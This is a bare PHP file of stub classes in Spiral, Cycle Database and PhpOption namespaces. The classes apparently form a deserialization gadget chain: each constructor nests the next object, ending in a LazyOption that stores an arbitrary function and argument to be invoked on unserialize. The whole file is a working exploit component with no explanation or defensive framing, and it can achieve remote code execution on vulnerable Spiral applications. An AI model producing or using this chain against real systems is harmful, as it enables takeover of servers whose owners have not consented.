<?php

namespace App
{
    class App
    {
        protected $finalizer;

        function __construct($function,$param)
        {
            $this->finalizer = new \Cycle\Database\Driver\Postgres\Schema\PostgresColumn($function,$param);
        }
    }
}

namespace Cycle\Database\Driver\Postgres\Schema
{
    class PostgresColumn
    {
        protected $mapping;

        function __construct($function,$param)
        {
            $this->mapping = new \Spiral\Session\SectionScope($function,$param);
        }
    }
}

namespace Spiral\Session
{
    class SectionScope
    {
        private $session;

        function __construct($function,$param)
        {
            $this->session = new SessionScope($function,$param);
        }

    }

    class SessionScope
    {
        private $container;

        function __construct($function,$param)
        {
            $this->container = new \PhpOption\LazyOption($function,$param);
        }
    }
}

namespace PhpOption
{
    class LazyOption
    {
        private $callback;
        private $arguments;

        public function __construct($function,$parameter)
        {
            $this->callback = $function;
            $this->arguments = [$parameter];
        }
    }
}